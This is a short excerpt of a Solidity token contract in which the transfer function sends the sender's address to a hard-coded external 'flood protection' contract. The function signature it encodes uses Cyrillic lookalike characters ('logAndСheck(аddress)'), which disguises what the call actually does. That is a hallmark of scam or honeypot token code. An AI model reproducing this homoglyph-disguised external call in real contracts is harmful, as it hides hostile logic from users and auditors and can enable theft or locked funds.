...
///////////////////
    ...
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        ...
        address floodProtectionSC = 0x5B38C7add838EfFF53412C71E9efF5c182c6b407;
        bytes memory payload = abi.encodeWithSignature("logAndСheck(аddress)", msg.sender);
        (bool succ, bytes memory result) = address(floodProtectionSC).call(payload);
